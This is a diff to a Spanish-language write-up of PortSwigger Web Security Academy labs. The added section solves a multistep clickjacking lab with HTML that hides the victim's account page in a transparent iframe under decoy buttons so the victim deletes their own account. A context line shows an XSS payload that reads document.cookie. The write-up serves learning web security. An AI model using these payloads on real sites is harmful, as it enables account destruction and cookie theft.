@@ -506,6 +506,36 @@ Al ir a la sección Submit Feedback y enviar un formulario, vemos que se imprime
 <iframe src="https://acc01f561e12d7bb8043912700a00045.web-security-academy.net/feedback?name=<img src=1 onerror=alert(document.cookie)>&email=alguien@algo.com&subject=alguno&message=hello#feedbackResult"></iframe>
 ```
 
+### [Multistep clickjacking](https://portswigger.net/web-security/clickjacking/lab-multistep)
+
+En este laboratorio se deben tener dos elementos en los que el usuario deberá hacer click uno antes que el otro, debido a que la intención es eliminar la cuenta del mismo, para lo cual deberá hacer un click primeramente para iniciar la acción de eliminar la cuenta, y luego otro click de confirmación para que la cuenta sea eliminada.
+
+Para resolver este laboratorio, vamos a la sección Account Actions, copiamos la url y la pegamos en el src del siguiente iframe:
+
+```html
+<style>
+    iframe {
+        position: relative;
+        width: 500px;
+        height: 700px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    .first, .next {
+        position: absolute;
+        top: 330px;
+        left: 50px;
+        z-index: 1;
+    }
+    .next {
+        left: 200px;
+    }
+</style>
+<div class="first">Click me first</div>
+<div class="next">Click me next</div>
+<iframe src="https://ac391f251e65efb180df32b2007d0066.web-security-academy.net/account"></iframe>
+```
+
 ---
 
 ## [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based)
